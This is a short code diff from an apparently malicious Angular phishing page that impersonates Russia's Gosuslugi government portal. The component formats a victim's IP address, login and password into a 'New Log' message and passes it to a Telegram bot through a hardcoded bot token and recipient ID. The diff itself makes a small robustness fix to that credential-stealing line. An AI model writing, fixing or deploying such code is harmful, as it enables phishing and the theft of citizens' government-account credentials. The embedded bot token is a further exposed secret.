@@ -27,7 +27,7 @@ export class AppComponent implements OnInit {
 
 	sentMessage(): void {
 		if (this.prevValue.login !== this.form.get('login').value || this.prevValue.password !== this.form.get('password').value) {
-			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress.ip}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
+			const message = `Новый Лог – ГосУслуги🤟%0AIP: ${this.ipAddress?.ip}%0AЛогин: ${this.form.get('login').value}%0AПароль: ${this.form.get('password').value}`;
 			const token = '949565640:AAEGoYzcWtY0kC3MTI0KNfdkWFgxVe8NOQs';
 			Telegram.setToken(token);
 			Telegram.setRecipient('880595419');
